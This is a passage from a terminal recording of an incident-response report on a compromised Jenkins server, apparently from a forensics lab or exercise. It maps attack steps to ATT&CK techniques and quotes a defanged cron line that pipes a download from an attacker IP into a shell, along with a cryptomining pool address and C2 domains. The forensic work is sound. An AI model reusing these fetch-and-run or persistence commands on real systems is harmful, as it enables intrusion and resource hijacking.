[138.62448, "o", "\u001b[?2004h> "]
[138.624658, "o", "- **Alerted Status:** **SILENT** (Not detected in `/sas/alerts.json`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.624841, "o", "- **Details:** Attacker appended an unauthorized SSH public key to the `jenkins` user's `authorized_keys` file for persistent interactive access.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.624939, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> ### Step 5: Execution & Persistence — Cron Job\r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.625034, "o", "- **Technique:** T1053.003 - Scheduled Task/Job: Cron\r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.625278, "o", "- **Evidence:** `/disk/var/spool/cron/crontabs/jenkins:5` (Line 5: `* * * * * root <defanged beacon: curl hxxp://198.51.100.98/x | sh>`)\r\n\u001b[?2004l\r\u001b[?2004h"]
[138.625361, "o", "> "]
[138.625431, "o", "- **Alerted Status:** Alerted (`/sas/alerts.json:16` - ALERT-03, CHK-05)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.625631, "o", "- **Details:** Cron job configured to beacon every minute to `198.51.100.98` to re-download payloads (`xmrig`, `pgdaemon`, `php`, `redis`, `wget`).\r\n\u001b[?2004l\r"]
[138.625692, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.625774, "o", "### Step 6: Impact — Resource Hijacking / Cryptomining\r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.625838, "o", "- **Technique:** T1496 - Resource Hijacking\r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.626031, "o", "- **Evidence:** `/disk/opt/jenkins/.xmr/xmrig:1` (XMRig miner process pid 1337 mining to pool `stratum+tcp://xmr.jenkins.evil:3333`)\r\n\u001b[?2004l\r"]
[138.626095, "o", "\u001b[?2004h> "]
[138.626159, "o", "- **Alerted Status:** Alerted (`/sas/alerts.json:9` - ALERT-02, CHK-02)\r\n\u001b[?2004l\r\u001b[?2004h"]
[138.626217, "o", "> "]
[138.626279, "o", "- **Details:** Continuous high CPU usage caused by unauthorized cryptomining activities.\r\n\u001b[?2004l\r"]
[138.626359, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r"]
[138.626369, "o", "\u001b[?2004h> "]
[138.626457, "o", "### Step 7: Defense Evasion — Jenkins Log Truncation / Log Wiping\r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.626562, "o", "- **Technique:** T1070.002 - Indicator Removal on Host: Clear Linux or Mac System Logs\r\n\u001b[?2004l\r"]
[138.626631, "o", "\u001b[?2004h> "]
[138.626794, "o", "- **Evidence:** `/disk/var/lib/.cache/.wiped.bin:1` (Partial recovery showing C2 beaconing data to `198.51.100.98` / `update-jenkins.example.cn`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.626948, "o", "- **Alerted Status:** **SILENT** (Primary logs wiped; artifact recovered forensic fragment)\r\n\u001b[?2004l\r\u001b[?2004h"]
[138.627026, "o", "> "]
[138.627095, "o", "- **Details:** Attacker truncated primary Jenkins log files to hinder post-incident investigation.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[138.627146, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> "]
